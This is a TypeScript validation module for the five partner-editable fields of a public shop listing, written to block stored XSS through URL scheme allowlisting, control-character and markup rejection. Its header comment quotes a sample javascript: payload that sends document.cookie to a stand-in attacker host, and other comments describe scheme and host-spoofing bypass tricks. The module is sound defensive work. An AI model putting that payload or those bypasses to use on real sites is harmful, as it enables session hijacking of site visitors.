/**
 * Partner self-service field validation for the PUBLIC listing.
 *
 * WHY THIS FILE EXISTS. The five self-service fields (phone, email, website, opening info,
 * description) are the only listing columns a partner may write, and every one of them is
 * PUBLISHED VERBATIM to anonymous consumers on the shop finder and shop profile. Before this
 * module the handler enforced exactly two things: "is a string" and "<= 500 characters". So
 *
 *     { "website": "javascript:fetch('https://evil.example/'+document.cookie)" }
 *
 * was a valid, audited, 200-OK self-service edit, and the value landed in an `href` on a public
 * page. That is stored XSS with a partner credential as the only prerequisite, and the column-level
 * GRANT in 0058 does not help at all — the partner is fully entitled to write this column, it is
 * the VALUE that is dangerous.
 *
 * THE RULE THIS FILE ENFORCES: a value a partner may publish must be inert. Not "escaped later",
 * not "sanitised in the template" — inert at the point of storage, because the value is read back
 * by more than one surface (finder DTO, profile DTO, and whatever Codex builds next) and a rule
 * that lives in one renderer is a rule that the second renderer will not have.
 *
 * WHAT IS DELIBERATELY *NOT* DONE HERE:
 *  - No DNS resolution, no HEAD request, no reachability check. Validation must be a pure function:
 *    a network call on a write path turns a partner's typo into a request timeout, and turns the
 *    self-service endpoint into an SSRF primitive pointed at whatever the partner types.
 *  - No HTML sanitiser dependency. We do not permit ANY markup in these fields, so the correct
 *    answer is rejection, not sanitisation. Accepting-then-stripping teaches partners that markup is
 *    supported and leaves the door open the day the stripper is bypassed.
 *  - No Super Admin approval step. These are routine low-risk contact edits; requiring HQ to
 *    approve a phone number is the operational drag this release exists to remove.
 */

/** Shared ceiling for the short fields. Matches the pre-existing handler limit. */
export const MAX_SHORT_FIELD = 500;
/** Opening info and description are prose and get more room, still bounded. */
export const MAX_PROSE_FIELD = 2000;

/** Raised for a rejected self-service value. Carries the field so the UI can mark the right input. */
export class SelfServiceValidationError extends Error {
  public readonly code = "INVALID_INPUT";
  constructor(
    public readonly field: string,
    message: string,
  ) {
    super(message);
    this.name = "SelfServiceValidationError";
  }
}

/**
 * URL schemes a partner may publish.
 *
 * ALLOWLIST, never a denylist. A denylist of `javascript:`/`data:`/`file:` is defeated by the next
 * scheme someone thinks of (`vbscript:`, `blob:`, `jar:`, or simply `JaVaScRiPt:` if the check is
 * case-sensitive, or `java\nscript:` if the parser tolerates control characters). An allowlist of
 * two is defeated by nothing.
 */
const ALLOWED_URL_SCHEMES = new Set(["http:", "https:"]);

/**
 * Characters that must never survive into a published field.
 *
 * C0 controls, DEL, and the Unicode line/paragraph separators. U+2028/U+2029 are here specifically
 * because they terminate a line inside a JavaScript string literal — a value containing one can
 * break out of a naively-generated inline script even though it looks like ordinary whitespace in
 * every editor and in the database. NUL is here because it truncates in C string handling, which
 * means a value can validate as one thing and be read as another.
 */
// eslint-disable-next-line no-control-regex
const FORBIDDEN_CONTROL_CHARS = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F\u2028\u2029]/;

/**
 * Markup and injection sigils rejected outright in prose fields.
 *
 * `<` alone would be enough to stop a tag, but `>` is included so that a partner pasting prose with
 * unbalanced angle brackets gets one clear error rather than a half-accepted value, and `&#` is
 * rejected because a numeric character reference is how a filtered `<` comes back.
 */
const MARKUP_PATTERN = /[<>]|&#/;

/** Normalise before validating: trim, and collapse the value `""` to null so "clear this field" works. */
function normaliseOrNull(raw: string | null): string | null {
  if (raw === null) return null;
  const trimmed = raw.trim();
  return trimmed === "" ? null : trimmed;
}

function rejectControlChars(field: string, value: string): void {
  if (FORBIDDEN_CONTROL_CHARS.test(value)) {
    throw new SelfServiceValidationError(field, `The "${field}" field contains characters that cannot be published.`);
  }
}

/**
 * Validate a public website URL.
 *
 * Parsed with the WHATWG `URL` parser rather than a regular expression. That is deliberate: the
 * browser will parse the stored value with the same algorithm, so agreeing with `URL` is the only
 * way to guarantee that what we judged safe is what the browser will resolve. A regex that
 * disagrees with the parser is precisely how `javascript:` bypasses get built — the check reads one
 * string and the browser reads another.
 *
 * A bare `example.com` (no scheme) is UPGRADED to `https://example.com`, because rejecting it would
 * fail the most common thing a shop owner types, and defaulting to `http:` would publish a downgrade.
 */
export function validateWebsite(raw: string | null): string | null {
  const value = normaliseOrNull(raw);
  if (value === null) return null;
  rejectControlChars("website", value);
  if (value.length > MAX_SHORT_FIELD) {
    throw new SelfServiceValidationError("website", "That website address is too long.");
  }

  // Scheme-relative (`//evil.example`) is NOT upgraded — it inherits the page's scheme and is a
  // common way to smuggle a host past a naive "does it start with http" check. It has no scheme, so
  // it falls to the parse below and fails there rather than being silently prefixed.
  const candidate = /^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(value) || value.startsWith("//") ? value : `https://${value}`;

  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    throw new SelfServiceValidationError("website", "Enter a valid website address, for example https://yourshop.co.uk.");
  }

  if (!ALLOWED_URL_SCHEMES.has(parsed.protocol)) {
    // The message names the rule rather than echoing the rejected scheme back — echoing user input
    // into an error string is how a validation message becomes its own reflection vector.
    throw new SelfServiceValidationError("website", "A website address must start with http:// or https://.");
  }
  // A URL can carry the allowed scheme and still have no host (`http:///`, `https://`). Publishing
  // one produces a dead link, and `new URL` accepts it, so it must be rejected explicitly.
  if (!parsed.hostname || !parsed.hostname.includes(".")) {
    throw new SelfServiceValidationError("website", "Enter a valid website address, for example https://yourshop.co.uk.");
  }
  // Credentials in a published URL are always a mistake and often an attempt to make the displayed
  // host differ from the resolved one (`https://yourshop.co.uk@evil.example`).
  if (parsed.username || parsed.password) {
    throw new SelfServiceValidationError("website", "A published website address cannot contain a username or password.");
  }

  // Return the PARSER'S serialisation, not the partner's input. This is the single most important
  // line in the function: it guarantees the stored value is exactly what the parser judged safe,
  // so no residue of the original string (odd casing, stray whitespace, encoded characters) can be
  // re-interpreted differently by a consumer later.
  return parsed.toString();
}

/**
 * Validate a public contact email.
 *
 * A pragmatic syntax check, NOT RFC 5322. A full RFC 5322 grammar accepts quoted local parts with
 * spaces and comments, which no shop needs and which every downstream consumer mishandles. This is
 * the "one @, a sane local part, a dotted host, nothing dangerous" rule, which is what the field is
 * actually for.
 */
export function validateEmail(raw: string | null): string | null {
  const value = normaliseOrNull(raw);
  if (value === null) return null;
  rejectControlChars("email", value);
  // 254 is the maximum length of a deliverable address (SMTP path limit), so anything longer is
  // certainly not an email regardless of how it is spelled.
  if (value.length > 254) {
    throw new SelfServiceValidationError("email", "That email address is too long.");
  }
  if (MARKUP_PATTERN.test(value)) {
    throw new SelfServiceValidationError("email", "Enter a valid email address.");
  }
  // Exactly one @, a non-empty local part with no whitespace, and a dotted domain whose last label
  // is alphabetic. Anchored at both ends so no prefix/suffix can ride along.
  const ok = /^[^\s@]{1,64}@[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*\.[A-Za-z]{2,}$/.test(
    value,
  );
  if (!ok) {
    throw new SelfServiceValidationError("email", "Enter a valid email address, for example hello@yourshop.co.uk.");
  }
  return value;
}

/**
 * Validate a public phone number.
 *
 * Deliberately permissive about FORM (a shop may publish "01634 123456", "+44 1634 123456", or
 * "01634 123456 (Mon-Fri)") and strict about CONTENT. No attempt is made to verify the number is
 * real or dialable — that is a claim we cannot make and would be lying to a consumer if we implied.
 */
export function validatePhone(raw: string | null): string | null {
  const value = normaliseOrNull(raw);
  if (value === null) return null;
  rejectControlChars("phone", value);
  if (value.length > 40) {
    throw new SelfServiceValidationError("phone", "That phone number is too long.");
  }
  if (MARKUP_PATTERN.test(value)) {
    throw new SelfServiceValidationError("phone", "Enter a valid phone number.");
  }
  // A phone number that contains a scheme is someone trying to publish a link in a phone field.
  if (/[a-zA-Z][a-zA-Z0-9+.-]*:/.test(value)) {
    throw new SelfServiceValidationError("phone", "Enter a phone number, not a web or email address.");
  }
  // Must contain enough digits to be a phone number at all. Without this, "call the shop" validates.
  const digits = value.replace(/\D/g, "");
  if (digits.length < 7 || digits.length > 15) {
    throw new SelfServiceValidationError("phone", "Enter a valid phone number.");
  }
  return value;
}

/**
 * Validate a prose field (opening information, description).
 *
 * NO MARKUP AT ALL. These fields are plain text, and rejecting `<` outright means no consumer has to
 * be trusted to escape them. Newlines are permitted — opening hours are naturally multi-line — which
 * is why `\n` and `\r` are excluded from FORBIDDEN_CONTROL_CHARS while every other control character
 * is not.
 */
export function validateProse(field: string, raw: string | null): string | null {
  const value = normaliseOrNull(raw);
  if (value === null) return null;
  rejectControlChars(field, value);
  if (value.length > MAX_PROSE_FIELD) {
    throw new SelfServiceValidationError(field, `The "${field}" field is too long (maximum ${MAX_PROSE_FIELD} characters).`);
  }
  if (MARKUP_PATTERN.test(value)) {
    throw new SelfServiceValidationError(
      field,
      `The "${field}" field cannot contain HTML or angle brackets. Plain text only.`,
    );
  }
  // A bare scheme inside prose is fine ("see https://... for details") — prose is rendered as TEXT,
  // never as a link, so no scheme check applies here. Rejecting it would stop a shop writing its own
  // web address in its description, which is a legitimate thing to do.
  return value;
}

/** The self-service field keys, mapped to their listing column and their validator. */
export const SELF_SERVICE_VALIDATORS: Record<string, { column: string; validate: (v: string | null) => string | null }> = {
  phone: { column: "public_phone", validate: validatePhone },
  email: { column: "public_email", validate: validateEmail },
  website: { column: "public_website", validate: validateWebsite },
  openingInfo: { column: "public_opening_info", validate: (v) => validateProse("openingInfo", v) },
  description: { column: "public_description", validate: (v) => validateProse("description", v) },
};
